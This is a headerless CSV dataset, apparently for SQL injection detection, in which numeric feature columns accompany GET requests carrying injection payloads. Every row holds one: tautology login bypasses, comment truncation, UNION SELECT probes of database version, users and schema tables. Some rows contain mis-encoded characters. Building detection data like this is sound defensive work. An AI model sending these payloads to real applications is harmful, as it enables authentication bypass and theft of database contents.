32,1,200,3365,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6734,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
39,1,200,5920,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7610,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7057,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4285,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
31,1,200,3721,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,2532,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,6416,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,5755,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,1208,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
33,1,200,5136,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
33,1,200,4690,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
39,1,200,6248,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
81,1,200,4882,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,4499,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,3130,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
41,1,200,5335,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
37,1,200,4707,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
40,1,200,3913,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,6771,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4505,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,3001,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4064,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,7942,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
64,1,200,2259,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
47,1,200,3680,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
26,1,200,7862,7,7,6,2,1,GET login/?id='*' HTTP/1.1
26,1,200,6852,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
36,1,200,3156,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,4801,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,2748,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,3988,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,2416,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
36,1,200,1706,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
28,1,200,3858,7,4,7,1,1,GET ?id=' or '1¡¬='1 HTTP/1.1
32,1,200,5844,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,4795,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,1583,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,3164,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
32,1,200,2983,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
32,1,200,2060,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
32,1,200,2250,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
32,1,200,7765,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
40,1,200,4218,7,16,8,2,1,GET login/?id=' and 'one'='one¡V HTTP/1.1
26,1,200,3411,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
20,1,200,1209,7,2,6,1,1,GET ?id='-' HTTP/1.1
24,1,200,7850,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
24,1,200,1512,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
43,1,200,5971,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
39,1,200,4702,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
26,1,200,1782,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
41,1,200,5718,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
25,1,200,6039,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
30,1,200,3877,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
24,1,200,5058,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
31,1,200,5656,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
25,1,200,5996,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,4405,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,4872,7,7,5,2,1,GET login/?id='# HTTP/1.1
25,1,200,5695,7,7,5,2,1,GET login/?id='# HTTP/1.1
32,1,200,4041,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
37,1,200,1696,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
34,1,200,1119,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
32,1,200,6482,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
32,1,200,1457,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
49,1,200,3949,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
49,1,200,4709,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
26,1,200,5088,7,8,5,1,1,GET ?id=or true-- HTTP/1.1
88,1,200,5866,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3461,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
36,1,200,1668,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
26,1,200,6645,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,1470,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
38,1,200,5165,7,11,12,2,1,GET login/?id=') or ('x')=('x HTTP/1.1
30,1,200,7053,7,4,8,1,1,GET ?id=) or ('1¡¬='1¡V HTTP/1.1
91,1,200,3644,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,5119,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
27,1,200,1883,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
33,1,200,4463,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
25,1,200,1799,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
37,1,200,4103,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
26,1,200,3396,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
33,1,200,4431,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
